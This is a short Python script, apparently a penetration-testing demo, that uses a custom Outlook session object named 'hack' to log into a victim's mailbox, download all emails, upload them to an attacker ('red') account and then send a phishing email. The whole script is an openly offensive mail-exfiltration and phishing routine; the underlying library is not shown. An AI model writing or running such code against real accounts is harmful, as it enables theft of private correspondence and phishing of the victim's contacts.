from Outlook import Session
import getpass



# Login Single Account
hack = Session(red_username='demopentest', red_domain='outlook.com', red_password='', domain='outlook.com', username='demopownedvictim', password='')



emailList = hack.vic_download_emails()


print("\n\n These are the original emails: ")
print("---------------------------------\n\n")
try:
    for item in emailList:
        print(item.subject)
except TypeError:
    print("Probably no emails in the list...")


print("\n\nUploading to folder")
hack.red_upload_emails(emails=emailList)
""" """

hack.send_phishing_email()
